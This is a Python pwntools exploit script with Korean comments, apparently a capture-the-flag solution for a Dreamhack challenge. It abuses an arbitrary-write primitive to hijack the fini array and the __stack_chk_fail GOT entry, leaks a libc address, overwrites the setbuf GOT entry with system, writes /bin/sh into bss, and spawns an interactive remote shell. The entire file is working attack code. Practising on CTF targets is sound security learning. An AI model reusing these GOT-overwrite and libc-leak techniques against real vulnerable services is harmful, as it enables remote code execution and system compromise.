from pwn import *
from time import sleep

# 디버깅을 위해 모든 패킷을 볼 수 있게 설정
#context.log_level = 'debug'

host = 'host3.dreamhack.games'
port = 22169 # 상황에 맞게 포트 번호를 변경하세요.

print(f"\n[DEBUG] 🎯 타겟 서버 {host}:{port} 에 연결합니다...")
p = remote(host, port)

def overwrite(a, b):
    print(f"[DEBUG] overwrite({hex(a)}, {hex(b)}) 호출")
    # a 값 전송
    a_payload = f'{str(int(a))[::-1]}'.encode()
    print(f"   -> [a] Send: {a_payload}")
    p.sendline(a_payload)
    sleep(0.1)
    
    # b 값 전송
    b_payload = f'{str(int(b))[::-1]}'.encode()
    print(f"   -> [b] Send: {b_payload}")
    p.sendline(b_payload)
    sleep(0.1)

try:
    print("\n[DEBUG] =========================================")
    print("[DEBUG] [1단계] Fini Array & Canary 루프 구성 시작")
    print("[DEBUG] =========================================")
    overwrite(0xf6, 0x6009c0) # fini array 2
    overwrite(0xf6, 0x600bc8) # canary (stack_chk_fail GOT)
    overwrite(4, 0x6009b8)    # fini array 1
    overwrite(0xDA, 0x600bc8) # canary
    overwrite(4, 0x600bc8)    # canary
    overwrite(6, 0x600bc9)    # canary

    print("\n[DEBUG] =========================================")
    print("[DEBUG] [2단계] Libc Leak을 위한 주소 조작 시작")
    print("[DEBUG] =========================================")
    # 기존 코드의 치명적 오타 수정 (be1 -> bd1)
    print("[DEBUG] -> setbuf GOT에 puts 로직 쓰기")
    overwrite(0xce, 0x600bd0) 
    overwrite(0x5, 0x600bd1)  # (수정됨) 0x600be1 -> 0x600bd1
    overwrite(0x40, 0x600bd2) # (수정됨) 0x600be2 -> 0x600bd2
    overwrite(0x0, 0x600bd3)  # (수정됨) 0x600be3 -> 0x600bd3
    overwrite(0x0, 0x600bd4)  # (수정됨) 0x600be4 -> 0x600bd4
    overwrite(0x0, 0x600bd5)  # (수정됨) 0x600be5 -> 0x600bd5

    print("[DEBUG] -> __libc_start_main GOT를 main 주소로 변경")
    overwrite(0xf6, 0x600b98)
    overwrite(0x5, 0x600b99)
    overwrite(0x40, 0x600b9a)
    overwrite(0x0, 0x600b9b)
    overwrite(0x0, 0x600b9c)
    overwrite(0x0, 0x600b9d) 

    print("\n[DEBUG] =========================================")
    print("[DEBUG] [3단계] Leak 트리거 및 주소 수신")
    print("[DEBUG] =========================================")
    overwrite(0x8, 0x600c00)
    print("[DEBUG] -> __stack_chk_fail을 통해 Leak 트리거!")
    overwrite(0x64, 0x600bc8) 

    print("[DEBUG] -> 서버로부터 Libc 주소 누출을 기다립니다...")
    leak_data = p.recvuntil(b'\x7f')
    leaked_addr = u64(leak_data[-6:].ljust(8, b'\x00'))
    print(f"\n[SUCCESS] ✨ Leaked Pointer : {hex(leaked_addr)}")

    # -------------------------------------------------------------
    # [핵심 수정] 누출된 포인터의 실제 libc 오프셋은 0x3ec8b0 입니다.
    # -------------------------------------------------------------
    libc_base = leaked_addr - 0x3ec8b0
    
    try:
        libc = ELF('./libc-2.27.so')
        system_addr = libc_base + libc.symbols['system']
    except Exception as e:
        print(f"[WARNING] ELF 로드 실패. 하드코딩된 오프셋을 시도합니다. ({e})")
        system_addr = libc_base + 0x4f440 

    print(f"[SUCCESS] 🗺️ Calculated Libc Base : {hex(libc_base)}")  # 무조건 000으로 끝나야 정상!
    print(f"[SUCCESS] 🎯 Calculated System Addr: {hex(system_addr)}")

    # 계산된 system 주소를 바이트 리스트로 변환
    bytes_list = list(system_addr.to_bytes(8, 'little'))
    
    print("[DEBUG] -> AAW 루프 복구")
    overwrite(4, 0x600BC8)

    print("\n[DEBUG] =========================================")
    print("[DEBUG] [4단계] System 덮어쓰기 및 페이로드 세팅")
    print("[DEBUG] =========================================")
    print("[DEBUG] -> setbuf GOT를 system 주소로 덮어쓰기")
    overwrite(bytes_list[0], 0x600BD0)
    overwrite(bytes_list[1], 0x600BD1)
    overwrite(bytes_list[2], 0x600BD2)
    overwrite(bytes_list[3], 0x600BD3)
    overwrite(bytes_list[4], 0x600BD4)
    overwrite(bytes_list[5], 0x600BD5)

    print("[DEBUG] -> bss 영역(0x600C10)에 /bin/sh 쓰기")
    binsh = [0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00]
    for i in range(7): # 널바이트 전까지
        overwrite(binsh[i], 0x600C10+i)

    print("[DEBUG] -> stdin 포인터(0x600C00)가 /bin/sh를 가리키게 조작")
    stdin = [0x10, 0x0c, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00]
    for i in range(7):
        overwrite(stdin[i], 0x600c00+i)

    print("[DEBUG] -> sleep GOT를 main 내부 루틴으로 덮어쓰기")
    slep = [0xf6, 0x05, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]
    for i in range(7):
        overwrite(slep[i], 0x600BE0+i)

    print("\n[DEBUG] =========================================")
    print("[DEBUG] [5단계] 쉘 획득 최종 트리거!")
    print("[DEBUG] =========================================")
    overwrite(0xa9, 0x600B98)
    overwrite(0x64, 0x600BC8)

    print("\n[SUCCESS] 🎉 쉘을 획득했습니다! Interactive 모드로 진입합니다.")
    p.interactive()

except Exception as e:
    print(f"\n[ERROR] 스크립트 실행 중 예외 발생: {e}")